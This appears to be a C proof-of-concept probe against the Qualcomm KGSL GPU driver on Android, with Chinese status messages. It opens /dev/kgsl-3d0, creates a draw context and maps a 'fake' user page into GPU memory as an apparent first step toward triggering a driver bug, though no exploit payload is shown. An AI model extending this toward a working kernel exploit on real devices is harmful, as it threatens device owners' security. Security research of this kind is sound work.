#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdint.h>

#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(0x09, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_MAP_USER_MEM _IOWR(0x09, 0x15, struct kgsl_map_user_mem)

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
struct kgsl_map_user_mem { int fd; unsigned long gpuaddr; size_t len; size_t offset; unsigned long hostptr; unsigned int memtype; unsigned int flags; };

int main() {
    printf("[*] 开始尝试基于正确的 IOCTL 命令码触发 KGSL...\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        perror("[-] 无法打开 /dev/kgsl-3d0");
        return 1;
    }

    struct kgsl_drawctxt_create create_req = { .flags = 0x00001812 };
    int ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &create_req);
    if (ret < 0) { perror("[-] KGSL DRAWCTXT 创建失败"); close(fd); return 1; }
    printf("[+] 创建 GPU 上下文成功，ID: %u\n", create_req.drawctxt_id);

    void *fake_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    struct kgsl_map_user_mem map_req = { .hostptr = (unsigned long)fake_page, .len = 4096, .memtype = 2 };
    ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &map_req);
    if (ret < 0) { perror("[-] KGSL 映射失败"); close(fd); return 1; }
    printf("[+] GPU 映射成功，GPU 地址: 0x%lx\n", map_req.gpuaddr);

    close(fd);
    return 0;
}